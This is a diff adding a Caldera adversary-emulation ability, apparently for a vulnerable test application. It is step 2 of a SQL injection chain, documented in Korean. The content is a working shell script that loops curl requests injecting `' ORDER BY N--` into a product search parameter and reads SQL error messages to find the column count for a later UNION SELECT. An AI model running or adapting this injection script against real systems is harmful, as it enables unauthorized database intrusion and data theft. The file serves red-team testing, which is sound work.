@@ -1,0 +1,36 @@
+- id: f4a2b0d8-3c5e-4f70-b9d3-6e8f0a2c4b6d
+  name: SQL Injection - Column Count Enumeration (Step 2)
+  description: ORDER BY N-- 구문을 순차적으로 시도하여 SELECT 절의 컬럼 수를 탐색합니다. 에러가 발생하는 N 직전 값이 실제 컬럼 수이며, UNION SELECT 구성에 활용됩니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1190"
+          ABILITY_ID="f4a2b0d8-3c5e-4f70-b9d3-6e8f0a2c4b6d"
+          TARGET="http://#{target.url}"
+
+          # products 테이블 컬럼 5개(id/name/description/price/stock) 확정용:
+          # 1~5는 정상 응답(200), 6에서 에러가 발동되어야 컬럼 수가 5로 확정됨
+          echo "[*] Step 2: ORDER BY로 컬럼 수 탐색 (1~6)"
+          for i in 1 2 3 4 5 6; do
+            RESPONSE=$(curl -s -w "\n__HTTP_CODE__:%{http_code}" \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/products/search?keyword=%27+ORDER+BY+${i}--")
+
+            BODY=$(echo "${RESPONSE}" | sed '$d')
+            HTTP_CODE=$(echo "${RESPONSE}" | tail -n1 | cut -d':' -f2)
+
+            if echo "${BODY}" | grep -qE "sql_state|BadSqlGrammar|bad SQL grammar"; then
+              echo "  [>] ORDER BY ${i} → HTTP ${HTTP_CODE} ★ ERROR (컬럼 수 = $((i-1)) 확정)"
+            else
+              echo "  [>] ORDER BY ${i} → HTTP ${HTTP_CODE} OK"
+            fi
+          done
